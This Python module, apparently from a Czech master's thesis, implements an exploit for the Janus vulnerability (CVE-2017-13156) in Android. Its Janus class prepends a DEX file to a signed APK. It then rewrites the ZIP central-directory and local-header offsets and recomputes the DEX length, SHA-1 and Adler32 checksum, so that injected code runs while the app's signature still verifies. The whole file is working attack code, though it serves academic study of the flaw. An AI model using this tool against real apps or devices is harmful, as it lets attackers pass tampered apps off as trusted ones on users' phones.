# Tento kód je součást diplomové práce "Využití zranitelnosti Janus na operačním systému Android"
# Autor: Bc. Vít Souček (soucevi1@fit.cvut.cz)
#
# Použité zdroje:
#     - Proof-of-concept využití zranitelnosti Janus:
#         autor: V-E-O
#         dostupné z: https://github.com/V-E-O/PoC/tree/master/CVE-2017-13156
#         Převzata hlavní myšlenka a postup tohoto zdroje. Zdroj není citován na konkrétních místech v kódu,
#         neboť téměř celý kód byl pro potřeby této práce upraven a přepsán
#
#     - Specifikace formátu souboru PKZip:
#         autor: Florian Buchholz (buchhofp@jmu.edu)
#         dostupné z: https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html
#         V komentářích v kódu referována pouze jako "dokumentace".


import struct
import hashlib
from zlib import adler32


class Janus:
    """
    Třída realizující samotný útok. Dokáže upravit ofsety
    v původním APK, připojit DEX před APK a aktualizovat
    položky v hlavičkách obsahující kontrolní sumu a délku souborů.
    """

    def __init__(self, apk, dex):
        """
        Objekt této třídy obsahuje data souborů APK a DEX.

        :param apk: Objekt s daty APK souboru
        :param dex: Objekt s daty DEX souboru
        :type apk: apk.Apk
        :type dex: dex.Dex
        """
        self.apk = apk
        self.dex = dex

    def update_offsets(self):
        """
        Upraví ofsety ZIP sekcí v APK po tom, co před data APK
        jsou připojena data DEX souboru.
        Konkrétně jde o ofsety:
            - počátek Central Directory (zapsaný v sekci End of Central Directory)
            - Ofsety sekcí Local File Header jednotlivých souborů
                (zapsány v každé hlavičce File Header v sekci Central Directory)
        """
        new_cd_start = self.apk.cd_start + self.dex.length
        self.update_cd_start(new_cd_start)

        print(f'Start of the Central Directory offset updated: {self.apk.cd_start} ---> {new_cd_start}')

        current_fh = self.apk.cd_start
        while current_fh < self.apk.end_of_central_directory:
            lh_offset = self.apk.get_local_header(current_fh)
            new_lh_offset = lh_offset + self.dex.length
            self.update_local_header(new_lh_offset, current_fh)
            current_fh = self.apk.get_next_file_header(current_fh + 46, self.apk.end_of_central_directory)
            if current_fh == -1:
                break
        print(f'Updated local header offsets')

    def update_cd_start(self, new_offset):
        """
        Upraví ofset počátku sekce Central Directory v sekci End of Central Directory.
        Výsledný ofset je zapsán na místo určené dle dokumentace: End Of Central Directory + 16.

        :param new_offset: Nový ofset počátku Central Directory
        :type new_offset: long
        """
        self.apk.data[self.apk.end_of_central_directory + 16:self.apk.end_of_central_directory + 20] = struct.pack("<L", new_offset)

    def update_local_header(self, new_offset, cd_file_header_offset):
        """
        Upraví ofset sekce Local Header. Výsledný ofset zapsán na místo
        určené v dokumentaci (Central Directory File Header + 42).

        :param new_offset: Nový ofset sekce Local Header
        :param cd_file_header_offset: Aktuální ofset sekce Central Directory File Header
        :type new_offset: long
        :type cd_file_header_offset: long
        """
        self.apk.data[cd_file_header_offset + 42:cd_file_header_offset + 46] = struct.pack("<L", new_offset)

    def join_the_files(self):
        """
        Připojí data APK za data souboru DEX,
        upraví délku souboru v hlavičce a kontrolní součet.

        :return: Spojená data obou souborů se správnou délkou a kontrolním součtem
        :rtype: bytearray
        """
        out_data = self.dex.data + self.apk.data
        print(f'Updating data length to {len(out_data)}')
        self.update_data_length(out_data)
        print(f'Updating checksum')
        self.update_checksum(out_data)
        return out_data

    @staticmethod
    def update_checksum(data):
        """
        Upraví kontrolní součet APK souboru s přepsanými ofsety.

        :param data: Data upraveného APK
        :type data: bytearray
        """
        m = hashlib.sha1()
        m.update(data[32:])

        # Úprava SHA1 v DEX hlavičce
        data[12:12 + 20] = m.digest()

        # Výpočet kontrolní sumy pro všechna data kromě
        # DEX hlavičky a sekce 'Adler32'
        v = adler32(memoryview(data[12:])) & 0xffffffff

        # Zápis kontrolní sumy do dat APK
        data[8:12] = struct.pack("<L", v)

    @staticmethod
    def update_data_length(data):
        """
        Upraví sekci s délkou souboru (dle dokumentace) tak,
        aby seděla na spojená data

        :param data: Data spojených souborů
        :type data: bytearray
        """
        data[32:36] = struct.pack("<L", len(data))
